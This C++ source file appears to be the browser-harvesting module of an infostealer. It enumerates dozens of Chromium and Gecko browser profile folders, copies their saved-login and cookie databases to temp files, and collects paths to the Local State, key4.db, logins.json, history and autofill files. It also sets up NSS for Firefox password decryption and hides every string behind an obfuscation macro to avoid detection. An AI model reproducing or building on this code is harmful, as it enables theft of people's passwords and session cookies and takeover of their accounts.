#include "Browser_Paths.hpp"

#include <iostream>
#include <vector>
#include <filesystem>
#include "glob.hpp"
#include "os.hpp"
#include "obfusheader.h"
#include "winapi_structs.hpp"
#include <cstdlib>

namespace fs = std::filesystem;


bool ends_with(const std::string& str, const std::string& suffix) {
    return str.size() >= suffix.size() && str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

std::vector<std::string> getChromiumBrowsers() {
    const std::string LOCAL = OS::getenv(OBF("LOCALAPPDATA"));
    const std::string ROAMING = OS::getenv(OBF("APPDATA"));

    return {
        LOCAL + OBF("\\Google\\Chrome"),
        LOCAL + OBF("\\Google\\Chrome SxS"),
        LOCAL + OBF("\\Chromium"),
        LOCAL + OBF("\\BraveSoftware\\Brave-Browser"),
        LOCAL + OBF("\\Microsoft\\Edge"),
        LOCAL + OBF("\\Yandex\\YandexBrowser"),
        ROAMING + OBF("\\Opera Software\\Opera Stable"),
        ROAMING + OBF("\\Opera Software\\Opera GX Stable"),
        LOCAL + OBF("\\Amigo"),
        LOCAL + OBF("\\Torch"),
        LOCAL + OBF("\\Kometa"),
        LOCAL + OBF("\\Orbitum"),
        ROAMING + OBF("\\Comodo\\Dragon"),
        LOCAL + OBF("\\CentBrowser"),
        LOCAL + OBF("\\7Star\\7Star"),
        LOCAL + OBF("\\Sputnik\\Sputnik"),
        LOCAL + OBF("\\Vivaldi"),
        LOCAL + OBF("\\Atom"),
        LOCAL + OBF("\\Maxthon"),
        ROAMING + OBF("\\Maxthon3"),
        LOCAL + OBF("\\AcWebBrowser"),
        LOCAL + OBF("\\Epic Privacy Browser"),
        LOCAL + OBF("\\uCozMedia\\Uran"),
        LOCAL + OBF("\\CocCoc\\Browser"),
        LOCAL + OBF("\\Elements Browser"),
        LOCAL + OBF("\\Iridium"),
        ROAMING + OBF("\\360Browser\\Browser"),
        ROAMING + OBF("\\Mail.Ru\\Atom")
    };
}

std::vector<std::string> getGeckoBrowsers() {
    const std::string ROAMING = OS::getenv(OBF("APPDATA"));

    return {
        ROAMING + OBF("\\Mozilla\\Firefox"),
        ROAMING + OBF("\\Waterfox"),
        ROAMING + OBF("\\K-Meleon"),
        ROAMING + OBF("\\Thunderbird"),
        ROAMING + OBF("\\Comodo\\IceDragon"),
        ROAMING + OBF("\\8pecxstudios\\Cyberfox"),
        ROAMING + OBF("\\Moonchild Productions\\Pale Moon"),
        ROAMING + OBF("\\NETGATE Technologies\\BlackHawk"),
        ROAMING + OBF("\\Mozilla\\SeaMonkey")
    };
}

std::vector<std::string> GetChromiumProfile(const fs::path& path) {
    std::vector<std::string> profiles;
    try {
        for (const auto& dir : fs::directory_iterator(path)) {
            if (dir.is_directory() &&
                (ends_with(dir.path().string(), OBF("Default")) ||
                    dir.path().string().find(OBF("Profile")) != std::string::npos)) {
                profiles.emplace_back(dir.path().string());
            }
        }
    }
    catch (const std::exception&) {}
    return profiles;
}

std::vector<std::string> GetGeckoProfile(const fs::path& path) {
    std::vector<std::string> profiles;
    try {
        for (const auto& dir : fs::directory_iterator(path)) {
            if (dir.is_directory() &&
                (ends_with(dir.path().string(), OBF(".default-default")) ||
                    dir.path().string().find(OBF(".default-release")) != std::string::npos)) {
                profiles.emplace_back(dir.path().string());
            }
        }
    }
    catch (const std::exception&) {}
    return profiles;
}

std::vector<BrowserDir> BPath::GetBrowserPaths() {
    std::vector<BrowserDir> bd;

    for (const auto& browser : getChromiumBrowsers()) {
        fs::path userData = fs::path(browser) / OBF("User Data");
        if (!fs::exists(userData)) continue;

        for (const auto& dir : GetChromiumProfile(userData)) {
            fs::path loginData = fs::path(dir) / OBF("Login Data");
            fs::path cookies = fs::path(dir) / OBF("Network\\Cookies");
            fs::path tempLogin = fs::temp_directory_path() / "temp_login_data.sqlite";
            fs::path tempCookies = fs::temp_directory_path() / "temp_cookies.sqlite";

            try {
                if (fs::exists(loginData)) fs::copy_file(loginData, tempLogin, fs::copy_options::overwrite_existing);
                if (fs::exists(cookies)) fs::copy_file(cookies, tempCookies, fs::copy_options::overwrite_existing);
            }
            catch (...) {}

            bd.emplace_back(BrowserDir{
                BrowserType::CHROMIUM, dir,
                (fs::path(dir) / OBF("Local State")).string(),
                tempLogin.string(), tempCookies.string(),
                (fs::path(dir) / OBF("Web Data")).string(),
                (fs::path(dir) / OBF("History")).string(),
                (fs::path(dir) / OBF("Bookmarks")).string()
                });
        }
    }

    for (const auto& browser : getGeckoBrowsers()) {
        fs::path profilesPath = fs::path(browser) / OBF("Profiles");
        if (!fs::exists(profilesPath)) continue;

        for (const auto& dir : GetGeckoProfile(profilesPath)) {
            fs::path key4 = fs::path(dir) / OBF("key4.db");
            fs::path logins = fs::path(dir) / OBF("logins.json");
            fs::path cookies = fs::path(dir) / OBF("cookies.sqlite");

            if (!fs::exists(key4) || !fs::exists(logins) || !fs::exists(cookies)) continue;

            bd.emplace_back(BrowserDir{
                BrowserType::GECKO, dir,
                key4.string(), logins.string(), cookies.string(),
                (fs::path(dir) / OBF("places.sqlite")).string()
                });

            std::string nssPath = (fs::path(dir) / "..").string();
            _putenv_s("NSS3_DIR", nssPath.c_str());
        }
    }
    return bd;
}
